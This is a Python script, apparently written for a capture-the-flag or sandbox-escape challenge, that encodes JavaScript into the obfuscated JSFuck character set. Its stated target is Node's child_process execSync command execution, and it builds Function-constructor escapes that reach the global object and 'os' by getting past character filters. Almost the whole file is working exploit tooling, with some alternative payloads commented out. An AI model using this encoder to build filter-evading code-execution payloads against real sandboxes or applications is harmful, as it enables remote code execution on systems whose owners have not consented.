"""
require('child_process').execSync('ls').toString()
"""

print(set("require('child_process').execSync('ls').toString()"))


def generate(word):
    enc = []
    for c in word:
        enc.append(f"({D[c]})")
    return "+".join(enc)


def extract(enc, i):
    return f"({enc})[{generate(str(i))}]"


def update():
    global D
    nD = D.copy()
    for word, enc in D.items():
        for i, c in enumerate(word):
            if c not in nD:
                nD[c] = extract(enc, i)
    D = nD


D = {
    "0": "(+![]+[])[+![]]",
    "1": "(+!![]+[])[+![]]",
    "2": "((+!![])+(+!![])+[])[+![]]",
    "3": "((+!![])+(+!![])+(+!![])+[])[+![]]",
    "4": "((+!![])+(+!![])+(+!![])+(+!![])+[])[+![]]",
    "5": "((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]]",
    "6": "((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]]",
    "7": "((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]]",
    "8": "((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]]",
    "9": "((+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+(+!![])+[])[+![]]",
    "e": "(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]])[+!![]]",
}

D["11e20"] = generate("11e20")
D["1.1e+21^w^"] = f'+({D["11e20"]})+[]'
D["false^w^"] = "![]+[]"
D["true^w^"] = "!![]+[]"
D["undefined^w^"] = "[][[]]+[]"
update()

# ****************************************
# []["filter"]
# ****************************************
filter = generate("filter")
D["function filter() { [native code] }^w^"] = f'[][{generate("filter")}]+[]'
update()

# ****************************************
# []["filter"]["constructor"]('return assert')()['fail']+[]
# ****************************************
constructor = generate("constructor")
return_assert = generate("return os")
debug = generate("os")
fail = generate("version")
print(f"[][{filter}][{constructor}]({return_assert})()[{fail}]+[]")


# # ****************************************
# # []["filter"]["constructor"]('return assert')()['fail']+''
# # ****************************************
# constructor = generate("constructor")
# return_assert = generate("return assert")
# debug = generate("assert")
# fail = generate("fail")
# print(f"[][{filter}][{constructor}]({return_assert})()[{fail}]+''")


# ****************************************
# []["filter"]["constructor"]("return this")()['atob']
# ****************************************
constructor = generate("constructor")
return_this = generate("return this")
atob = generate("atob")
# print(f"[][{filter}][{constructor}]({return_this})()[{atob}]")

# ****************************************
# []["filter"]["constructor"]("return escape")()("=")
# ****************************************
return_escape = generate("return escape")
# print(f"[][{filter}][{constructor}]({return_escape})()")

# ****************************************
# []["filter"]["constructor"]("return Date")()()
# ****************************************
return_date = generate("return Date")
# print(f"[][{filter}][{constructor}]({return_date})()()")

# # ****************************************
# # require('crypto')['sign']
# # ****************************************
# require = generate("require")
# crypto = generate("crypto")
# sign = generate("sign")
# print(f"{require}({crypto})[{sign}]")
